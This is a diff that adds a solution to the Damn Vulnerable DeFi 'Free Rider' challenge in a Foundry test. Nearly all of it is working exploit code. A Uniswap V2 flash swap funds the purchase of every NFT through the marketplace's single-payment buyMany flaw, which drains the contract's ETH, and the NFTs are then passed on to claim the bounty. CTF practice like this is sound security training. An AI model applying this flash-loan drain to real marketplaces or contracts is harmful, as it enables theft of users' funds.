@@ -9,7 +9,7 @@ import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
-import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
+import {FreeRiderRecoveryManager, IERC721Receiver} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
 contract FreeRiderChallenge is Test {
@@ -123,7 +123,12 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        UniswapV2FlashSwapReceiver fsr = new UniswapV2FlashSwapReceiver(weth, uniswapPair, marketplace, nft, player);
+        uniswapPair.swap(NFT_PRICE, 0, address(fsr), "x");
+        bytes memory data = abi.encode(player);
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            nft.safeTransferFrom(address(fsr), address(recoveryManager), i, data);
+        }
     }
 
     /**
@@ -144,5 +149,55 @@ contract FreeRiderChallenge is Test {
         // Player must have earned all ETH
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
+    }
+}
+
+contract UniswapV2FlashSwapReceiver {
+    WETH weth;
+    IUniswapV2Pair uniswapPair;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT nft;
+    address player;
+
+    constructor(
+        WETH _weth,
+        IUniswapV2Pair _uniswapPair,
+        FreeRiderNFTMarketplace _marketplace,
+        DamnValuableNFT _nft,
+        address _player
+    ) {
+        weth = _weth;
+        uniswapPair = _uniswapPair;
+        marketplace = _marketplace;
+        nft = _nft;
+        player = _player;
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
+        // buy nfts
+        weth.withdraw(amount0);
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+        marketplace.buyMany{value: 15 ether}(tokenIds);
+
+        // approve all nfts to player
+        nft.setApprovalForAll(player, true);
+
+        // return borrowed weth back to UniswapV2
+        uint256 fee = 0.1 ether;
+        uint256 totalRepay = 15 ether + fee;
+        weth.deposit{value: totalRepay}();
+        weth.transfer(address(uniswapPair), totalRepay);
+
+        uint256 remain = 90 ether - totalRepay;
+        payable(player).transfer(remain);
+    }
+
+    receive() external payable {}
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
     }
 }
